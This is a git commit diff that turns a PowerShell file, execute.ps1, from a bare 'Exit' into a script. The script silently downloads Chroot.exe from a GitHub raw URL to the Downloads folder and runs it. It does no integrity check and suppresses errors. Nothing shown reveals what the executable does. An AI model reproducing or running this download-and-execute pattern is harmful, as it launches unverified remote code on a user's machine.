866fd893284725ad1d70ec4ef7b2f2d310c063e8
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-05 22:25:44 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,1 +1,11 @@
-Exit
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Chroot.exe"
+
+$downloadPath = Join-Path $env:USERPROFILE "Downloads\Chroot.exe"
+
+Invoke-WebRequest -Uri $url -OutFile $downloadPath -ErrorAction SilentlyContinue
+
+if (Test-Path $downloadPath) {
+    Start-Process -FilePath $downloadPath -Wait
+} else {
+
+}
